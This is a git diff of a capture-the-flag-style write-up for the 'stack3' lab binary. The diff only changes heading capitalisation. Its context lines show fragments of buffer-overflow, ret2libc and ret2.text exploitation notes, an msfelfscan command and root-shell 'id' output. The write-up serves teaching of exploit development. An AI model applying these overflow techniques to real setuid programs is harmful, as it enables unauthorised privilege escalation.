@@ -1,6 +1,6 @@
-# Stack3
+# stack3
 
-## Solution
+## solution
 Quick disassembly to see the offsets of the variables stored in the binary.
 ```
 [0x08048370]> pdf @main
@@ -22,9 +22,9 @@ calling function pointer, jumping to 0x08048424
 code flow successfully changed
 ```
 
-## Shells
+## shells
 
-### Classic
+### classic buffer overflow
 Since the program will always call the address stored in `var_8h` we can't overwrite %eip like we
 usually would. So in this case we're going to use `var_8h` in the same way we would %eip, and use
 it to redirect process execution.
@@ -58,7 +58,7 @@ calling function pointer, jumping to 0xbffff828
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Ret2libc
+### ret2libc
 Read stack0 to see how we calculated the appropriate offsets for `libc`, `system` and `/bin/sh`
 required for this ret2libc exploit.
 
@@ -90,7 +90,7 @@ id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Ret2.text to Shellcode 
+### ret2.text to shellcode 
 ```
 ➜  stack git:(master) ✗ msfelfscan -s -f stack3
 0x080484e7   edi ebp ret
@@ -132,7 +132,7 @@ calling function pointer, jumping to 0x08048478
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Ret2.text to Libc
+### ret2.text to libc
 ```py
 import struct
 
